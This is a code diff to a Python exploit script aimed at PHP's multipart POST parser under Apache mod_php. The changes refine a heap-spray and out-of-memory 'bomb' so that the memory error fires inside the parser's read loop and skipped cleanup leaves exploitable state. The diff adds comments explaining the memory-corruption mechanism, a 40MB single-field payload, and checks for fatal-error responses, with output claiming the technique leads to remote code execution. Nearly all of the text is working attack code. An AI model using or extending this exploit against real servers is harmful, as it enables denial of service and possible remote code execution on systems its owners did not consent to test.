@@ -216,15 +216,26 @@ def build_heapshape_bomb(boundary, spray_count, spray_data,
         parts.append(part)
 
     # --- Bomb phase: trigger OOM ---
+    #
+    # The OOM must happen INSIDE the multipart parser's body-reading loop
+    # (multipart_buffer_read_body), not during variable registration.
+    # Parser-internal OOM causes longjmp() to skip cleanup of partially-
+    # constructed structures, which is the exploitable condition.
+    #
+    # We send ONE form field whose value exceeds memory_limit.  The parser
+    # calls erealloc() in a loop to grow its read buffer; when the buffer
+    # crosses memory_limit, OOM fires mid-read and longjmp() skips the
+    # buffer's efree() and the header list cleanup.
     if bomb_strategy == "headers":
-        num_headers = bomb_kwargs.get("num_headers", 5000)
-        header_size = bomb_kwargs.get("header_size", 500)
-        bomb = f"--{boundary}\r\n"
-        bomb += f'Content-Disposition: form-data; name="bomb"; filename="b"\r\n'
-        for i in range(num_headers):
-            bomb += f"X-Pad-{i}: {'A' * header_size}\r\n"
-        bomb += "\r\nZ\r\n"
-        parts.append(bomb.encode())
+        bomb_size = bomb_kwargs.get("bomb_size", 40 * 1024 * 1024)
+        part_header = (
+            f"--{boundary}\r\n"
+            f'Content-Disposition: form-data; name="bomb"\r\n'
+            f"\r\n"
+        ).encode()
+        parts.append(part_header)
+        parts.append(b"B" * bomb_size)
+        parts.append(b"\r\n")
 
     elif bomb_strategy == "nested":
         depth = bomb_kwargs.get("depth", 10)
@@ -420,6 +431,14 @@ def run_heapshape_attack(host, port, path, strategy, spray_count,
         print("[!] No handler address — spray will use NULL pointers")
         print("    (crash pattern analysis only; no RCE execution)")
 
+    # The bomb sends ONE large form field whose value exceeds memory_limit.
+    # The parser's multipart_buffer_read_body() calls erealloc() in a loop;
+    # OOM fires mid-read, causing longjmp() to skip cleanup.
+    bomb_size = bomb_kwargs.get("bomb_size", 40 * 1024 * 1024)
+    spray_mem = spray_count * ZOBJ_BIN_SIZE
+    print(f"[*] Bomb: single {bomb_size//(1024*1024)}MB field "
+          f"(memory_limit ≈ 32MB, spray {spray_mem//1024}KB)")
+
     spray_data = build_spray_data(handler_ptr, ZOBJ_BIN_SIZE)
     print(f"[*] Spray object size: {len(spray_data)} bytes × {spray_count} copies")
 
@@ -468,6 +487,8 @@ def run_heapshape_attack(host, port, path, strategy, spray_count,
                 break
             elif b"500" in status.encode():
                 print("    [+] Server returned 500 — OOM bailout triggered")
+            elif b"Allowed memory size" in oom_resp or b"Fatal error" in oom_resp:
+                print("    [+] OOM detected in response body (200 status with fatal error)")
             elif b"200" in status.encode():
                 print("    [-] Server returned 200 — OOM not reached")
                 print("        Try increasing --num-headers or --spray-objects")
@@ -693,6 +714,10 @@ def main():
             print("\n[+] Server returned 500 — OOM likely triggered!")
             print("    On Apache mod_php, the request shutdown procedure "
                   "runs on invalid state.")
+            print("    With heap shaping, this leads to RCE.")
+        elif b"Allowed memory size" in resp or b"Fatal error" in resp:
+            print("\n[+] OOM triggered! (200 status but fatal error in body)")
+            print("    PHP exhausted memory_limit during POST processing.")
             print("    With heap shaping, this leads to RCE.")
         elif not resp or b"connection" in resp.lower():
             print("\n[+] Connection dropped — server process may have crashed!")
